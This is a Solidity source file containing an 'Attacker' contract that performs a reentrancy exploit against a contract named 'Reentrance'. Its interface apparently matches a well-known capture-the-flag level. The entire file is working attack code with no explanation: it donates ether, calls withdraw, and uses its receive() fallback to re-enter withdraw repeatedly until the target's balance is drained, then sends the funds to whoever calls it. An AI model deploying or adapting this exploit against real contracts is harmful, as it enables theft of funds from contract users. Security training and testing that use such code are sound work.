// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract Attacker {
    IReentrance private immutable target;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);
        require(address(target).balance == 0, "target contract balance > 0"); // Confirm our attacked worked and code is correct.
    }

    function withdraw() external payable {
        (bool success, ) = msg.sender.call{value:address(this).balance}("");
        require(success,"Failed");
    }

    receive() external payable {
        uint amount = min(1e18,address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) public pure returns(uint256) {
        return x <= y ? x : y;
    }
}

